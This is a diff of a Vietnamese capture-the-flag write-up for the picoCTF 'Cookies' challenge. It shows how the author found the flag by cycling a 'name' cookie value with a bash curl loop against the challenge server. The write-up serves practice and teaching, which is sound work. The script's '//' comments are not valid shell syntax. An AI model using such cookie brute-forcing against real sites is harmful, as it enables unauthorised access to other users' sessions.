@@ -7,11 +7,32 @@ Who doesn't love cookies? Try to figure out the best one. [http://mercury.picoc
 Ok nhập tùm lum vô để search, xong mình F12, mở tab `Network`, vào `/search` thì thấy Cookie là `name=-1` (sai bét nhè). 
 Và đập vào hai con mắt mình là chữ mờ `Snickerdoodle` ở ô nhập, thì mình cứ thế mà nhập nó vào thôi, và nó chuyển thành công qua web `/check`.
 
-![[Pasted image 20251108170650.png]]
+<img width="1285" height="1068" alt="Pasted image 20251108170650" src="https://github.com/user-attachments/assets/0cee4338-f113-4b28-af04-7a982255ac8f" />
+
 
 Và giờ Cookie đã đổi sang `name=0`, nó gợi trong đầu mình 1 suy nghĩ là:
 
 *~Có khi nào có brute-force từ 1 đến số nào đó không?~*
+
+Nên mình sử dụng code sau:
+
+```
+for i in {1..50}; do
+    contents=$( // lưu trữ toàn bộ nội dung HTML
+        curl -s http://mercury.picoctf.net:54219/ // -s (silent) không báo lỗi
+        -H "Cookie: name=$i; Path=/" // đặc Header Cookie
+        -L // theo dõi các chuyển hướng
+    )
+	
+	// điều kiện kiểm tra, '!' chỉ đúng nếu trang ko chứa "Not very special", tức cookie đặc biệt đã được tìm thấy
+	// -q trả về exit code
+	
+    if ! echo "$contents" | grep -q "Not very special"; then
+        echo "$contents" | grep "pico"
+        break
+    fi
+done
+```
 
 Có vẻ là hợp lý, nên là mình vào terminal, nhập lệnh này là xong:
 
